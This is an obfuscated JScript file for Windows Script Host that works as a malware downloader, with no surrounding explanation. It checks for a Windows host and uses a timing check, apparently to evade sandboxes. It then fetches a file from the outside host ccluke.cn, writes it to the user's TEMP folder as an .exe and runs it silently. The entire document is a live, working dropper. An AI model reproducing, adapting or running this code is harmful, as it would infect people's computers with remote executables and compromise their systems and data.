var _SK = false;
var _YX = "CreateObject";
var _UO = function _H() {return WScript[_YX]("WScript"+".Shell");}(), _V = 11;
var _LI = "MSXML2.XMLHTTP";
var _U0 = 2123213;
var _U = 0;
function _WD(_Y0){_UO["Run"](_Y0, _U, _U);};
function _Q0(){return _LI + "";};
function _Y(_N0, _OY){_U = _U * 1; return _N0 - _OY;};
function _Q1(){return _YX;};
/*@cc_on
  @if (@_win32 || @_win64)
    _SK = true;
  @end
@*/
if (_SK)
{
var _K = "";
function _Q(){return 22;};
var _YP = 0; var _B0 = 0;
function _VT()
{
var _TT = new this["Date"]();
var _A = _TT["getUTCMilliseconds"]();
WScript["Sleep"](_Q());
var _TT = new this["Date"]();
var _M = _TT["getUTCMilliseconds"]();
WScript["Sleep"](_Q());
var _TT = new this["Date"]();
var _AF = _TT["getUTCMilliseconds"]();
var _YP = "_TN";
_YP = _Y(_M, _A);
var _B0 = "_S0";
_B0 = _Y(_AF, _M);
_K = "open";
return _Y(_YP, _B0);
}
var _XS = false;
var _L0 = false;
for (var _CF = _U; _CF < _Q() * 1; _CF++){if (_VT() != _U){
_XS = true; 
_B0 = "31" + 11 * _YP + _B0; 
_L0 = true; 
break;
}}
function _N() {return ((_XS == true) && (_XS == _L0)) ? 1 : _U;};
if (_XS && _N() && _L0){
function _S() {return _UO["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "4E0D8ABV.ex" + "e";};
 _WA = _Q0();
 _K0 = WScript[_YX](_WA);
 var _I = 1;
 while (_I){
try {
	if (_I == 1)
	{
		_K0[_K]("GET", "http://ccluke.cn/b7eus", false);
		_K0["send"]();
		_TE = "Sleep";
	}
	WScript[_TE](_Q() + 120); 
	if (_K0["readystate"] < 2 * 2) continue;
	_I = _U;
	function _NN(_B) {var _L = (1, 2, 3, 4, 5, _B); return _L;};
	_Q2 = WScript[_Q1()]("ADODB.Stream");
	_WA = _Q2;
	_WA[_K]();
	_WA["type"] = _NN(1);
	_WA["write"](_K0["ResponseBody"]);
	_Q2["position"] = _NN(_U);
	_WA["Save" + "ToFile"](_S(), 2);
	_Q2["cl"+"ose"]();
	_XN = _S();
	_WD(_XN);
} catch(_RX){};
}
}
}

